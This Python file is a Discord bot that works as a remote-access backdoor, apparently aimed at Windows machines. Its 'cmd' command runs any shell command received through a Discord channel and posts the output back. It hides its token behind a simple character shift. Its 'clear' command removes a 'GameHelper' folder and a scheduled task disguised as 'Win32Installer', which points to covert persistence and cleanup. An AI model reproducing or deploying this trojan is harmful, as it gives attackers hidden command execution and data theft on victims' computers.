import nextcord
from nextcord.ext import commands
import os, shutil
from asyncio import create_subprocess_shell, subprocess


class Spy:
    Bot = commands.Bot(intents=nextcord.Intents.all(), command_prefix='!')
    EncryptStep = None
    Channel = None
    ChannelID = None
    Role = None


    @staticmethod
    def Decrypt(string) -> str:
        return ''.join([chr(ord(c)-Spy.EncryptStep) for c in str(string)])

    @staticmethod
    def Run():
        Get = lambda k: os.environ.get(k)

        Spy.EncryptStep = int(Get("ENC"))
        Spy.ChannelID = int(Spy.Decrypt(Get("CHA")))
        
        Spy.Bot.run(Spy.Decrypt(Get("TOK")))

    @staticmethod
    async def Status():
        await Spy.Channel.send("`Status: On`")

    @Bot.event
    async def on_ready():
        Spy.Channel = Spy.Bot.get_channel(Spy.ChannelID)
        await Spy.Status()

    @Bot.command()
    async def status(ctx):
        await Spy.Status()

    @Bot.command()
    async def cmd(ctx, *args):
        command = ' '.join(args).strip()
        
        proc = await create_subprocess_shell(command, shell=1, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = map(lambda x: f"```{x}```"*bool(x),map(lambda x: x.decode().strip(), await proc.communicate()))
        await Spy.Channel.send(out+err or "No output")

    @Bot.command()
    async def clear():
        path = f'{os.environ["USERPROFILE"]}\\GameHelper'
        if not os.path.exists(path):
            return 

        shutil.rmtree(path)
        await create_subprocess_shell("schtasks /Delete /TN Win32Installer /F > nul 2> nul")